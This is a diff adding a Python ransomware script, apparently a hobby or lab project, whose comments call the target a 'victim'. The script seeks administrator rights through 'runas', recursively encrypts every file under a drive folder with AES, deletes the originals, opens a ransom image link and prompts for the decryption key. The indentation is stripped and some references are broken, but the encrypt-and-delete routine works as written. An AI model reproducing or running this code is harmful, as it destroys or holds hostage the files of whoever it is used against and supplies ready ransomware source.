@@ -1,0 +1,109 @@
+import os 
+import tkinter as tk 
+from tkinter import simpledialog 
+import subprocess 
+from Crypto.PublicKey import RSA 
+from Crypto.Cipher import AES, PKCS1_OAEP 
+import ctypes 
+import base64 
+# RSA key pair producing function 
+def generate_rsa_key(): 
+key = RSA.generate(2048) 
+return key 
+# function to encrypt file using AES 
+def encrypt_file_aes(file_path, aes_key): 
+try: 
+with open(file_path, 'rb') as f: 
+plaintext = f.read() 
+cipher = AES.new(aes_key, AES.MODE_EAX) 
+ciphertext, tag = cipher.encrypt_and_digest(plaintext) 
+with open(file_path + '.enc', 'wb') as encrypted_file: 
+[encrypted_file.write(x) for x in (cipher.nonce, tag, ciphertext)] 
+os.remove(file_path) # Remove original plaintext file after encryption 
+print(f"Encryption of {file_path} successful.") 
+except Exception as e: 
+print(f"Error encrypting {file_path}: {e}") 
+# recursively encrypt files in a directory function 
+def encrypt_directory_aes(directory_path, aes_key): 
+for dirpath, dirnames, filenames in os.walk(directory_path): 
+for filename in filenames: 
+file_path = os.path.join(dirpath, filename) 
+encrypt_file_aes(file_path, aes_key) 
+# function to decrypt files using AES 
+def decrypt_file_aes(encrypted_file_path, aes_key): 
+try: 
+with open(encrypted_file_path, 'rb') as f: 
+nonce, tag, ciphertext = [f.read(x) for x in (16, 16, -1)] 
+cipher = AES.new(aes_key, AES.MODE_EAX, nonce) 
+plaintext = cipher.decrypt_and_verify(ciphertext, tag) 
+decrypted_file_path = encrypted_file_path[:-4] # Remove '.enc' extension 
+with open(decrypted_file_path, 'wb') as decrypted_file: 
+decrypted_file.write(plaintext) 
+os.remove(encrypted_file_path) # Remove encrypted file after decryption 
+print(f"Decryption of {encrypted_file_path} successful.") 
+except Exception as e: 
+print(f"Error decrypting {encrypted_file_path}: {e}") 
+# function to open ransome burner image 
+def open_dark_net_image(): 
+dark_net_image_link = "https://app.gemoo.com/share/image- 
+annotation/629065748762177536?codeId=P57AmB6YK3nJg&origin=imageurlgenerator&card=62906574 
+5104744448" 
+subprocess.Popen(['start', dark_net_image_link], shell=True) 
+# prompting the victim to enter the AES key function 
+def prompt_decryption_key(): 
+root = tk.Tk() 
+root.withdraw() # Hide the root window 
+# Prompt the user to enter the AES key 
+enc_aes_key_input = simpledialog.askstring("Decryption Key", "Enter the AES key:") 
+return enc_aes_key_input 
+# function to execute the script with elevated privileges or evading permission restriction 
+def run_with_elevated_privileges(): 
+if os.name == 'nt': 
+# If running on Windows, use 'runas' command to run with elevated privileges 
+ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable,     file , None, 1) 
+# producing RSA key pair for the victim 
+victim_rsa_key = generate_rsa_key() 
+# Save victim's public key to a file 
+with open("victim_public_key.pem", "wb") as f: 
+f.write(victim_rsa_key.publickey().export_key()) 
+# Save the victim's private key to a file 
+with open("victim_private_key.pem", "wb") as f: 
+f.write(victim_rsa_key.export_key()) 
+print("RSA key pair generated and saved successfully.") 
+# confirming if the script is running with elevated privileges 
+# if not, prompt the user to run the script as an administrator 
+if not ctypes.windll.shell32.IsUserAnAdmin(): 
+print("Please run the script as an administrator.") 
+run_with_elevated_privileges() 
+else: 
+# The script has elevated privileges, proceed with encryption/decryption tasks 
+# Generate AES key for file encryption 
+aes_key = os.urandom(32) # 256-bit AES key 
+aes_key_base64 = base64.b64encode(aes_key).decode() # Encode AES key as base64 
+print(f"Generated AES key: {aes_key}") 
+print(f"Base64-encoded AES key: {aes_key_base64}") 
+# encrypt files in the specified folder recursively 
+directory_path = os.path.join("E:", "critical") # Constructing the directory path properly 
+encrypt_directory_aes(directory_path, aes_key) 
+# Call function to open the ransome burner image 
+open_dark_net_image() 
+# prompting the victim to provide the AES key 
+enc_aes_key_input = prompt_decryption_key() 
+# function to decipher the base64-encoded AES key 
+def decode_aes_key(encoded_aes_key): 
+aes_key = base64.b64decode(encoded_aes_key) 
+return aes_key 
+# decrypting files in the specified directory iteratively 
+def decrypt_directory_aes(directory_path, aes_key): 
+for dirpath, dirnames, filenames in os.walk(directory_path): 
+for filename in filenames: 
+if filename.endswith('.enc'): 
+file_path = os.path.join(dirpath, filename) 
+decrypt_file_aes(file_path, aes_key) 
+# if decryption key entered by the victim matches, proceed with decryption 
+if enc_aes_key_input: 
+aes_key = decode_aes_key(enc_aes_key_input) 
+decrypt_directory_aes(directory_path, aes_key) 
+print("Decryption completed successfully.") 
+else: 
+print("No AES key provided. Decryption aborted.")
